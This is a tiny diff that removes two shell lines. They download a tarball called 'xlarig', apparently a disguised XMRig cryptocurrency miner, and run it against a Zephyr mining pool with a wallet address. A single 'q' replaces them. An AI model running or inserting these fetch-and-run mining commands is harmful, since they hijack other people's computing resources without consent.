@@ -1,2 +1,1 @@
-wget https://github.com/bengetsia/soft/raw/main/xlarig.tar.gz && tar -xvf xlarig.tar.gz
-./xlarig -o fr-zephyr.miningocean.org:5332 -u ZEPHs8rEtqZaJ25FqjXvMbiFvPjuVd9VKP8whAB56jDbcBSxQuPJEhyDC7SQCGKAzcC2kT7VybgQGfVKo73aB518g7XrdF7yc1C.50 000 -p tes -a rx/0 -k --donate-level 1
+q
